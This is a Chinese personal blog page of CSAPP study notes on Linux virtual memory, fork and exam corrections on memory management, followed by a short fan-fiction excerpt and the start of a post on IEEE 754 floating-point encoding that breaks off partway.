<p><code>mm_struct</code>描述虚拟内存的当前状态,其中的两个字段<code>pgd,mmap</code></p>
<p><code>pgd</code>指向一级页表的基址</p>
<p><code>mmap</code>指向<code>vm_area_structs</code>链表,该链表的每一个链表项都描述了当前虚拟内存地址空间的一个段.</p>
<blockquote>
<p>每个<code>vm_area_struct</code>链表项都有五部分组成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vm_start:段起始地址</span><br><span class="line">vm_end:段结束地址</span><br><span class="line">vm_prot:段的读写权限</span><br><span class="line">vm_flags:段共享或者进程私有标志等信息</span><br><span class="line">vm_next:指向下一个段</span><br></pre></td></tr></table></figure>
</blockquote>
<p>当该进程被执行的时候,pgd会被放到<code>CR3</code>寄存器中</p>
<h3 id="Linux缺页异常处理"><a href="#Linux缺页异常处理" class="headerlink" title="Linux缺页异常处理"></a>Linux缺页异常处理</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517081116670.png" alt="image-20220517081116670"></p>
<p>CPU指定一个虚拟地址,然后去<code>vm_area_struct</code>各个表项去查该虚拟地址是否属于$[vm_{start},vm_{end}]$之间,如果各个链表项都不包含该地址则说明该地址没有被分配,发生段错误</p>
<p>如果没有发生段错误则检查该内存访问的性质,是读还是写,如果对只读区域进行写入则报告保护异常</p>
<p>上述两种情况都通过了则表明这是真的缺页了,使用某种页调度算法牺牲一个物理页,用这个缺页挤掉</p>
<h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>啥是内存映射呢?</p>
<p>以共享虚拟内存举例</p>
<p>两个进程的页表相互独立,但是可以指向物理内存中的同一区域,比如共享库</p>
<p><strong>通过将一个虚拟内存区与磁盘上一个对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为内存映射</strong></p>
<h3 id="共享对象"><a href="#共享对象" class="headerlink" title="共享对象"></a>共享对象</h3><p>如果同时打开多个终端bash,它们会共享同一块只读代码区.多个程序调用库函数printf,但是实际最后调用到的printf只在物理内存中唯一存在</p>
<p>通过一个例子说明共享对象的过程</p>
<p>一开始时共享对象也只是虚拟内存上的一些页或者说段,尚未被任何进程映射.</p>
<p>现在进程1将共享对象映射到自己虚拟内存中的某个位置,并在物理内存中建立了物理页</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517083739843.png" alt="image-20220517083739843"></p>
<p>现在进程2也想映射共享对象,内核判断进程1已经映射过该共享对象,即共享对象已经存在于物理内存中,那么只需让进程2的相关页表项指向该共享对象在内存中快照的物理页</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084031704.png" alt="image-20220517084031704"></p>
<p><strong>私有写时复制对象</strong></p>
<p>什么时候一个对象不得不每个进程分别映射到不同的物理内存了,什么时候才会真的在物理内存上开两个对象的空间</p>
<p>在两个进程都没有尝试向私有对象写东西时,私有对象表现得和共享对象没有区别,物理内存中也只存在一份拷贝,因为这足以满足读的要求</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084442357.png" alt="image-20220517084442357"></p>
<p>当其中一个进程试图写私有对象时,由于要保证进程的虚拟地址空间独立,因此不得不将该私有对象做一个拷贝,在内存中存放两个私有对象,两个进程的页表项目各自挑一个指向</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084658157.png" alt="image-20220517084658157"></p>
<h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void);//子进程返回0,父进程返回子进程的pid,出错返回-1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.子进程获得一个pid</p>
<p>2.子进程得到与父进程<strong>一模一样</strong>的<strong>用户级</strong>虚拟地址空间<strong>拷贝</strong></p>
<blockquote>
<p>用户级虚拟地址空间包括</p>
<p>代码段</p>
<p>数据段</p>
<p>堆</p>
<p>共享库</p>
<p>用户栈</p>
</blockquote>
<p>3.子进程获得与父进程任何打开的文件描述符的副本</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> global=<span class="number">10</span>;<span class="comment">//观察父子进程是否有相同的.data节拷贝</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> local=<span class="number">20</span>;<span class="comment">//观察父子进程是否有相同的栈区拷贝</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actived\n&quot;</span>);<span class="comment">//观察fork前的部分是否会被子进程执行</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fork();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;<span class="comment">//根据pid判断是父进程还是子进程,fork对父进程返回子进程的pid,不为0,如果为0则说明当前进程为子进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child process,%d,%d\n&quot;</span>,global++,local++);<span class="comment">//打印后自增的目的是观察父子进程是否有独立的虚拟地址空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;father process,%d,%d\n&quot;</span>,global++,local++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actived					<span class="comment">#fork函数前只有父进程,fork之后才会两个进程都执行</span></span><br><span class="line">father process,10,20	 </span><br><span class="line">child process,10,20		<span class="comment">#子进程获得父进程虚拟地址空间的拷贝,但是两者独立,父进程地址空间内的变量自增不会影响子进程的地址空间</span></span><br></pre></td></tr></table></figure>

<p>子进程和父进程都打印到控制台表明两者共享文件描述符1(标准输出)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517091716338.png" alt="image-20220517091716338"></p>
<h2 id="内存动态分配"><a href="#内存动态分配" class="headerlink" title="内存动态分配"></a>内存动态分配</h2><p>动态内存分配器(dynamic memory allocator),维护进程的堆区</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517093706745.png" alt="image-20220517093706745"></p>
<p>堆顶指针为brk,堆的生长方向与栈相反,堆从低地址向高地址生长,栈从高地址向低地址生长</p>
<p>都是小端模式</p>
<p>分配器将堆看成一组大小不同的块集合,每个块是一个连续的虚拟内存片</p>
<p>已分配的块就是正在被使用的块,空闲块就是尚未被使用的块,可以被分配</p>
<p>根据<strong>谁来释放分配块</strong>,分配器可以分成两种</p>
<p><strong>显式分配器</strong>:比如C语言的malloc和free,C++的new和delete,要求程序员手动释放分配块</p>
<p><strong>隐式分配器</strong>:分配器自动回收不再使用的分配块,因此隐式分配器又叫垃圾收集器,比如Java中的分配器</p>
<p>关于分配器的实现,这个实验是一定要做到的,但不是现在</p>
<h2 id="习题订正"><a href="#习题订正" class="headerlink" title="习题订正"></a>习题订正</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612094124007.png" alt="image-20220612094124007"></p>
<p>这个题的问法太屑了,相当于给你说已知a是b他老子,问a他爹是谁</p>
<p>需要注意的是逻辑地址和物理地址是啥</p>
<p>逻辑地址就是磁盘交换分区,虚拟地址空间中的一个地址,</p>
<p>物理地址就是内存条子,物理地址空间中的一个地址</p>
<p>每个.c源程序编译成.o可重定位目标文件之后,其虚拟地址空间都是从0开始编址</p>
<p>然后多个.o(也有可能有.a静态库文件)链接成.out可执行目标文件,其虚拟地址空间还是从0开始编址的,比如$[0,0x100)$</p>
<p>在装载时(shell调用execve函数将进程加载进入物理地址空间),有可能将该.out虚拟地址空间的0号字节装载进入内存条子这个物理地址空间的0x100处,那么该进程对应的物理地址空间就可能是$[0x100,0x200)$(不考虑分页),如果考虑分页,那么虚拟地址空间可能被划分成多个虚拟页,在用到时被拷贝到一个物理页.</p>
<p>综上,形成逻辑地址的阶段是链接阶段</p>
<p>翻译成物理地址的阶段是装载</p>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095053544.png" alt="image-20220612095053544"></p>
<p>本题我选的B,纯粹是瞎选,选的时候就知道必定不对</p>
<p>出错是因为没有重视覆盖与交换技术,在此做一个复习</p>
<p>覆盖:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095244447.png" alt="image-20220612095244447"></p>
<p>铁打的固定区,流水的覆盖区,用到谁就先把覆盖区存一下,然后把需要的从外存中拎出来,直接盖在先前的覆盖区上</p>
<p>算法竞赛中使用滚动数组,感觉也是覆盖的思想</p>
<p>交换:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095647336.png" alt="image-20220612095647336"></p>
<p>在CSAPP上我们学过虚拟内存,缺页时发生替换的思想就是交换思想</p>
<p>这样看覆盖和交换都是新的替换旧的,好像说的是一个事情,但是区别:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095842607.png" alt="image-20220612095842607"></p>
<p>只有虚拟内存技术可以物理上拓展主存容量,而覆盖和交换技术在虚存之前就存在了</p>
<p>覆盖和交换还是在有限大的内存条子上做文章,只能通过扔掉当前用不到的,实现节省主存空间的作用</p>
<h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612100250957.png" alt="image-20220612100250957"></p>
<p>这个题A,B选项都不太熟悉,借机了解一下存储管理方式吧</p>
<p>存储管理方式从进程地址空间的连续性上分为连续方式和非连续方式</p>
<p><strong>连续方式,不行</strong></p>
<p>​	连续方式包括单一连续分配(单道连续分配),固定分区分配(多道固定连续分配),连续动态分配(多道可变连续分配)</p>
<p>单道连续分配是最早最low逼的方式,整个内存条子上最多允许一个进程独占</p>
<p>多道固定连续分配意思是内存条子上划出几个块,每个块让一个进程独占,各个进程老死不相往来</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612100928491.png" alt="image-20220612100928491"></p>
<p><strong>非连续方式,行</strong></p>
<p>​	非连续方式包括分段,分页,段页,都是比较近或者最近的操作系统正在使用的技术,比较熟悉</p>
<p>​	比如x86上使用段页式结构,x86-64上使用分页结构</p>
<h3 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612101143722.png" alt="image-20220612101143722"></p>
<p>这个题要清晰重定位的各种类型,谁来负责重定位,什么时候重定位</p>
<p>什么是重定位?<strong>装入时</strong>对目标程序中指令和数据的修改过程</p>
<p>一定要重定位吗?不一定,早期low逼程序和low逼内存系统上,程序编译完成之后一个各个变量指令的物理地址就知道了,不存在逻辑地址一说,比如在单道连续分配的内存系统上,一共就只有一个进程执行,整什么逻辑地址真是多次一举</p>
<p>凡是需要重定位的,一定有逻辑地址和物理地址的区分,重定位的过程就是将逻辑地址翻译成物理地址这个地址变换的过程</p>
<p>本题中A和B,都是连续存储方式,只要确定好程序在物理内存中的基地址,那么程序所有指令数据的地址就都确定了,根本不需要重定位,编译时决定物理地址即可</p>
<p>重定位的类型?静态重定位和动态重定位</p>
<p>​	静态重定位指地址变换在<strong>装载时</strong>一次完成</p>
<p>​	本题中D,段式结构就是静态重定位</p>
<p>​	动态重定位指地址变换在<strong>运行时</strong>才会进行</p>
<p>​	用于分页系统,因为虚拟页实际加载进入哪一个物理页,这由操作系统页面置换算法决定,不到运行时,是不知道虚拟页到底被加载到哪里的,该虚拟页上的数据和指令自然无法被重定位</p>
<h3 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612102551429.png" alt="image-20220612102551429"></p>
<p>我一开始选的是地址映射,我是这样考虑的</p>
<p>x86-64上任何进程都是从<code>0x400000</code>这个地址开始的,通过地址映射,该虚拟地址被翻译成不同的物理地址,因此不会出现两个进程虚拟地址空间指向同一块物理地址空间的情况,即避免了进程的相互干扰</p>
<p>我选的D,但是答案是B</p>
<p>意思是一个进程有一个基址寄存器和边界寄存器,该进程内任意内存访问不得超过两个寄存器规定的范围,因此由内存保护实现</p>
<h3 id="21"><a href="#21" class="headerlink" title="21."></a>21.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612103002978.png" alt="image-20220612103002978"></p>
<p>感觉这种题没有什么意义,让学生考虑段表和页表的大小,</p>
<p>用户物理地址空间&#x3D;总空间-页表或段表表占的空间</p>
<p>你直接问页表大还是段表大不就行了?</p>
<p>你直接问页和段谁大小可变不就行了?</p>
<p>非得绕着弯说,根考察三年级学生两年后你和你老子谁年龄大一样.</p>
<p>你不就是想考察段大小可变,页大小固定这个事儿吗</p>
<h3 id="24"><a href="#24" class="headerlink" title="24."></a>24.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612103815223.png" alt="image-20220612103815223"></p>
<p>单道系统上某一时刻只有一个程序在运行,只需要维护一个重定位寄存器,谁在执行就把谁的基地址放到重定位寄存器上</p>
<h3 id="26"><a href="#26" class="headerlink" title="26."></a>26.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104001176.png" alt="image-20220612104001176"></p>
<p>还是考察对四个选项概念是不是认识</p>
<p>“可变分区”实际上还是连续内存的low逼方法</p>
<p>前面14题已经分析过了,分页存储管理是动态链接的</p>
<p>“有利于动态链接”不如说”必须动态链接”</p>
<h3 id="28"><a href="#28" class="headerlink" title="28."></a>28.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104157764.png" alt="image-20220612104157764"></p>
<p>考察对”可重入”的理解</p>
<p>CSAPP上我们学过”可重入”函数,就是不访问临界区的线程安全函数</p>
<p>既然不访问临界区,那么多个进程共享这一块也是没问题的,</p>
<p>只需要将共享区放在内存上,让有需要的进程引用本共享区,不需要每个进程分别拷贝一份</p>
<p>怎么就减少对换数量了呢?</p>
<p>啥叫”兑换”?不是缺页置换</p>
<p>不需要每个进程都加载共享区,一共加载一次就可以</p>
<h3 id="29"><a href="#29" class="headerlink" title="29."></a>29.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104605803.png" alt="image-20220612104605803"></p>
<p>这里”代价”是啥呢?</p>
<p>分段时需要操作系统维护段表,分页时需要维护页表</p>
<p>段表和页表也要占用内存,这就是代价</p>
<p>知道的越少,人越觉得自己厉害,叫什么穷开心不是吗?</p>
<p>分区是最早的内存管理方式,只需要维护有几个区,每个区放了啥.并且区相对于页和段大得多,操作系统维护的区表相对于页表段表会小很多,因此代价少</p>
<h3 id="34"><a href="#34" class="headerlink" title="34."></a>34.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104843836.png" alt="image-20220612104843836"></p>
<p>前两条说的是真对,需要注意的是内碎片和外碎片是啥</p>
<p>第三条,影响磁盘访问时间的主要因素是啥呢?页面多大则需要从磁盘中拷贝出相应大小的页面,拷贝的越多用时越长,怎么就”主要因素通常不是页面大小了”,III项纯粹故意说很长的假话吓唬人</p>
<p>那么影响磁盘访问时间的主要因素是啥呢?</p>
<p>寻道时间、旋转延迟、数据传输时间</p>
<p>页面大小会影响数据传输时间,当然是主要因素</p>
<h3 id="35"><a href="#35" class="headerlink" title="35."></a>35.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612105228600.png" alt="image-20220612105228600"></p>
<p>这个题的ACD三要都是白给</p>
<p>这让我想到高三做过的一道化学题</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612105424208.png" alt="image-20220612105424208"></p>
<p>“取10.00ml稀释液的过程中,酸式滴定管的初始页面为0.20ml,左手控制活塞向锥形瓶中加稀释液,此时眼睛应该<code>____</code>“</p>
<p>你说写”睁着”吧,理论上也对,闭着眼儿万一倒手上把手烧个窝儿,还必须得睁着眼儿</p>
<p>那为啥不能写”睁着”呢?这睁着不是废话吗.这个题就想考察会不会说滴定流程的套话</p>
<p>在本题中我一开始选的A,这也是废话,页面大小一定得依据内存大小确定啊,要是内存4G,你整一个8G大小的页面有个锤子用呢?</p>
<p>本题就想考察”页面大小固定”这个事儿</p>
<p>但是D一定是不对的,外存就是一群乌合之众没有排面,内存少而精,外存一定是为内存服务的</p>
<p>C对不对呢?也有道理,比如如果数据总线宽度为64位,那么页面大小就1Byte占8位,都不够cpu拿来塞牙缝的.但是出题的认为这都不用说,是废话</p>
<h3 id="36"><a href="#36" class="headerlink" title="36."></a>36.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612110227309.png" alt="image-20220612110227309"></p>
<p>什么叫不懂装懂啊?</p>
<p>“方便操作”,怎么操作,什么操作?你把”操作”去掉也是一个意思</p>
<p>就说”A.方便”</p>
<p>不妨把话说的更明白一点</p>
<p>“A.好”</p>
<p>好个球子啊</p>
<p>因为BCD这些优点显而易见,出题的实在想不到说个啥缺点,就整了一个”A.方便操作”</p>
<p>实际上这个答案啥也没说,就好比让你评价一下学校对卢雷事件的处理,你说了个”好!”,怎么好了?给校风学风带来啥影响?给其他学生有啥影响?给外界啥影响?你是一个字不说,因为现在的处理方式吐不出象牙来</p>
<h3 id="39"><a href="#39" class="headerlink" title="39."></a>39.</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612110742608.png" alt="image-20220612110742608"></p>
<p>14题复习了重定位之后显然这个题选B,但是C和D我怎么没在教材上见到过</p>
<p>因为压根就没这两个概念.</p>
<p>这不就是某些政治家某些上级以及某些令人恶心的文科学科的口头禅吗</p>
<blockquote>
<p>正确的，直接的，中肯的，雅致的，客观的，完整的，立体的，全面的，辩证的，形而上学的，雅俗共赏的，一针见血的，直击要害的，错误的，间接的，虚假的，庸俗的，主观的，残缺的，平面的，片面的，孤立的，辩证法的..</p>
<p>落实,夯实,搞好,坚持,推进,改善,提高….</p>
<p>美国化,本土化,最大化,冲国化…</p>
</blockquote>
<p>政治跨考计算机的是不是就要选C了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/09/%E5%A4%AA%E7%A9%BA%E9%AD%94%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/09/%E5%A4%AA%E7%A9%BA%E9%AD%94%E6%95%B0/" class="post-title-link" itemprop="url">天空のグリニッジ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-09 18:18:00 / Modified: 18:19:29" itemprop="dateCreated datePublished" datetime="2022-06-09T18:18:00+08:00">2022-06-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="天空のグリニッジ"><a href="#天空のグリニッジ" class="headerlink" title="天空のグリニッジ"></a>天空のグリニッジ</h1><blockquote>
<p>上司啦，政治家啦以及那些现在已经不存在的独裁者们都一样是渺小的人类。</p>
<p>自己只要向着自己能够认同的方向努力就好了。只是看到宇宙的照片就会有这样的感觉。 　</p>
<p>宇佐见莲子和玛艾露贝莉·赫恩（梅莉）二人，正坐在大学校园内的露天咖啡屋中兴奋的交谈着。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/06/%E6%B5%AE%E7%82%B9%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/06/%E6%B5%AE%E7%82%B9%E6%95%B0/" class="post-title-link" itemprop="url">CSAPP-chapter2&3 浮点数的机器级表示</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-06 18:55:00 / Modified: 19:08:55" itemprop="dateCreated datePublished" datetime="2022-06-06T18:55:00+08:00">2022-06-06</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="浮点数的机器级表示"><a href="#浮点数的机器级表示" class="headerlink" title="浮点数的机器级表示"></a>浮点数的机器级表示</h1><p>师出有名</p>
<p>1.补上计组网课上摆烂留下的历史问题</p>
<p>2.将浮点数的表示和程序中的行为联系起来,完成CSAPP第二章和第三章最后剩下的浮点数部分</p>
<h2 id="药引子和命根子"><a href="#药引子和命根子" class="headerlink" title="药引子和命根子"></a>药引子和命根子</h2><h3 id="从十进制科学计数法说起"><a href="#从十进制科学计数法说起" class="headerlink" title="从十进制科学计数法说起"></a>从十进制科学计数法说起</h3><p>一个很长十进制数,成万上亿,在小学的时候我们就知道,可以用科学计数法表示</p>
<p>假设该十进制数按位展开表示成<br>$$<br>d&#x3D;d_{m}d_{m-1},,,d_{1}d_{0}.d_{-1}d_{-2},,,d_{-n}d&#x3D;\sum_{i&#x3D;-n}^{m}10^i\times d_i\<br>m,n\ge 0<br>$$</p>
<blockquote>
<p>注意$d_0.d_{-1}$中间是小数点</p>
</blockquote>
<p>用科学计数法表示<br>$$<br>d&#x3D;d_m.d_{m-1}d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^m\<br>&#x3D;0.d_md_{m-1}d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^{m+1}\<br>&#x3D;d_md_{m-1}.d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^{m-1}<br>$$<br>小数点每左移一位,$10$的指数就得增加1.</p>
<p>小学时学的科技法的规范形式,小数点左侧只能留下一个非零位,就比如:<br>$$<br>123.456&#x3D;1.23456\times 10^2<br>$$</p>
<p>**为啥要发明科学计数法呢?**举个例子</p>
<p>如果要表示两个整亿,不用科计法为$2’000’000’000$,表示这个数就用了10个十进制位,而其中后面9位都是0,包含了重复信息.</p>
<p>而如果用科技法表示为$2\times 10^9$</p>
<p>此时我们只需要保留两个信息,底数$2$和指数$9$,只用了两位</p>
<p>要是不是两个整亿呢?要是$2’987’654’321$呢?</p>
<p>此时如果要求保留全精度,科技法表示为$2.987654321\times 10^9$,相对于普通表示,需要多保存一个9</p>
<p>但是如果要求保留一位有效数字,科技法就可以表示为$3\times 10^9$,普通方法还得带着一伙子0</p>
<p>在数字很大的时候,我们往往更加关心量级和最高位,低位的数字相对欠重要,很多情况下要舍入</p>
<h3 id="从科计法到二进制"><a href="#从科计法到二进制" class="headerlink" title="从科计法到二进制"></a>从科计法到二进制</h3><p>不管是普通表示还是科技表示,二进制和10进制只有一个区别,即每一位的权重,</p>
<p>位权从10改成2就是二进制了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605185246553.png" alt="image-20220605185246553"><br>$$<br>b&#x3D;\sum_{i&#x3D;-n}^m 2^{i}\times b_i<br>$$<br>二进制的”科技法”也有一个规范形式,即小数点左侧只能留一个1</p>
<p>比如$5.125(10)&#x3D;101.001(2)&#x3D;1.01001\times 2^2(2科技)$</p>
<blockquote>
<p>十进制科技法的规范形式,小数点左侧只能留下一个非0数</p>
<p>为啥二进制不能说留下一个非零数?</p>
<p>二进制下要么是0要么是1,非零数就是1</p>
<p>并且二进制科技法中,小数点左侧只留下一个1,那么这个1就可以省去不表示,只要是所有人都知道这个协议,他们使用这个科技法的二进制数的时候就会自己添上最前面的1.这样又可以腾出一位来用于精度信息</p>
<p>为什么十进制不能省去小数点左侧的数?因为这个数可能是1~9这9个数任意一个.省去就丢失了信息.二进制科技法中可以省去,是因为小数点左侧一定是1</p>
</blockquote>
<h2 id="IEEE754标准"><a href="#IEEE754标准" class="headerlink" title="IEEE754标准"></a>IEEE754标准</h2><h3 id="浮点数的手写表示法"><a href="#浮点数的手写表示法" class="headerlink" title="浮点数的手写表示法"></a>浮点数的手写表示法</h3><p>IEEE754标准中将一个浮点数表示成这样<br>$$<br>V&#x3D;(-1)^s\times M\times 2^E<br>$$</p>
<blockquote>
<p>s,符号.s&#x3D;1则系数-1;s&#x3D;0则系数1</p>
<p>M,尾数,一个二进制小数,其取值范围有两种</p>
<p>$M\in[1,2)$,规格化数</p>
<p>$M\in [0,1)$,非规格化数</p>
<p>E,指数</p>
</blockquote>
<p>注意这里只是说”表示”,真的在计算机中编码实现时不是这样的</p>
<p>真到编码的时候咋编的呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605190631176.png" alt="image-20220605190631176"></p>
<p>左边是高位,右边是低位</p>
<p>最高位是符号位,这和刚才的表示是相同的</p>
<p>然后<code>exp</code>是”阶码”.对于32位的float类型,<code>exp</code>占用8位,对于64位的double类型,<code>exp</code>占用11位.</p>
<p>用k表示exp的位数,对于float来说,k&#x3D;11</p>
<blockquote>
<p>注意这里”阶码”是加了引号的,因为实际存储的时候,这里面存放的不是刚才的表示中的$E$,但是$E$是经过一些手续从$exp$换算得到的.这个换算过程是有固定套路的,这是后话</p>
</blockquote>
<p>然后是<code>frac</code>尾数M,占用了23位.这尾数和刚才的”表示”中也是不一样的,也需要分类讨论办点手续</p>
<p>用n表示frac的位数,对于float来说n&#x3D;23</p>
<blockquote>
<p>啥意思呢?举个例子</p>
<p>比如假设一个单精度浮点数float在计算机中的编码为:<br>$$<br>0’0000\ 0001’0000\ 0000\ 0000\ 0000\ 0000\ 001<br>$$</p>
<table>
<thead>
<tr>
<th>符号位s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0000 0001</td>
<td>0000 0000 0000 0000 0000 001</td>
</tr>
</tbody></table>
<p>如果认为$E&#x3D;0000\ 0001,M&#x3D;1$去算这个数得到<br>$$<br>b&#x3D;1\times 2^1&#x3D;10(2)&#x3D;2(10)<br>$$<br>这就错了,实际上这个数是<br>$$<br>1\frac{1}{2^{23}}\times 2^{-126}<br>$$</p>
<blockquote>
<p>这里$1\frac{1}{2^{23}}$是带分数</p>
</blockquote>
<p>为啥会这样呢?为啥不能直来直去,exp就表示E,frac就表示M?</p>
<p>这涉及到排序方便的问题,这是后话.</p>
<p>总之计算机中存储的浮点数直接拿出来并不是s,E,M这样排好的,需要办手续</p>
</blockquote>
<h3 id="浮点数的实际存储状态"><a href="#浮点数的实际存储状态" class="headerlink" title="浮点数的实际存储状态"></a>浮点数的实际存储状态</h3><h4 id="状态设计"><a href="#状态设计" class="headerlink" title="状态设计"></a>状态设计</h4><p>在设计浮点数的存储状态时,鳎们首先规定了几个特殊的状态:</p>
<p>1.正负无限大</p>
<p>2.不是数NAN</p>
<blockquote>
<p>给你一个32位数,让你考虑怎么用32个位表示一个数是正负无限大还是不是数还是正常数?</p>
<p>专门用两个状态位标记?比如开头两位,00表示正无限大,01表示负无限大,10表示不是数,11表示正常数.然后剩下30位在正常数时使用?</p>
<p>这样设计有啥意义呢?纯粹是页表状态学傻了,非得用一个标志位标志一下脏不脏是吧?</p>
<p>一个数要是无限大或者根本不是数,那么后面30位不都没有意义了吗?这在数电上就是无关项了.</p>
<p>看看人家IEEE754怎么规定的吧</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605192623246.png" alt="image-20220605192623246"></p>
<blockquote>
<p>只能说这种规定不流失不蒸发零浪费,把牙膏挤的一滴都不剩了.当看不明白这种定义的蜜汁操作时,使劲往空间利用效率上想就对了</p>
</blockquote>
<p>什么个想法呢?</p>
<p>1.符号位站最高位,不管如何符号位总得站一位吧.这里没有异议</p>
<p>2.无穷大,不管是正负,其exp全是1,frac全是0.</p>
<blockquote>
